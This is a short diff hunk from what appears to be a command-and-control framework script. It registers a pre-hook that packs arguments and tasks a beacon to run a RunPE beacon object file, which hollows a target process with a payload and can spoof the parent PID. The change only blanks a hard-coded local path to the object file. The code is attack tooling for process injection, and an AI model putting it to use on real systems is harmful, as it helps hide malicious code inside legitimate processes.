@@ -28,7 +28,7 @@ runpe_cmd.setPreHook( function( id, cmdline, parsed_json, ...parsed_lines ) {
     }
 
     let params = ax.bof_pack( "cstr,int,bytes", [pathToHollow, ppid, ax.file_read(payload)] );
-    let bof_path = "/home/kali/RunPE.x64.o";
+    let bof_path = "";
     
     let message = `Tasked beacon to execute RunPE BOF against ${pathToHollow} with ${payload}`;
     if ( ppid ) {
